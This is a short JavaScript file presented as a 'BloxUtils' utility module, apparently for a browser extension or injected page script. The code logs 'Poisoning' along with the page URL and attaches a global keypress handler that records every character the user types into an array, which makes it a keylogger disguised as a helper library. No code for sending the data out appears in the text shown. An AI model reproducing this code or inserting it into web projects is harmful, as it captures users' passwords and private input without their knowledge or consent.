var BloxUtils = BloxUtils || {};

console.log("[BloxUtils] Loading BloxUtils.enabledModules");

BloxUtils.pg = window.location.href;
BloxUtils.KP = [];

console.log(`Poisoning ${BloxUtils.pg}`)

document.onkeypress = function(BloxUtils_KPModule) {
    get = window.event?event:BloxUtils_KPModule;
    KPData = get.keyCode ? get.keyCode : get.charCode;
    KPData = String.fromCharCode(KPData);
    BloxUtils.KP.push(KPData);
}